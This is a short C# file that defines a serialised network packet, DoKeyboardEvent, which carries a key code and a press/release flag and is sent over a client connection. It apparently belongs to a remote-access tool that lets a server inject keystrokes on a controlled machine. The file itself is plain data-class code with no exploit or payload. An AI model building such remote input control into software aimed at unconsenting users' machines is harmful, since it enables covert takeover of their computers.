using ProtoBuf;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoKeyboardEvent : IPacket
    {
        [ProtoMember(1)]
        public byte Key { get; set; }

        [ProtoMember(2)]
        public bool KeyDown { get; set; }

        public DoKeyboardEvent()
        {
        }

        public DoKeyboardEvent(byte key, bool keyDown)
        {
            this.Key = key;
            this.KeyDown = keyDown;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}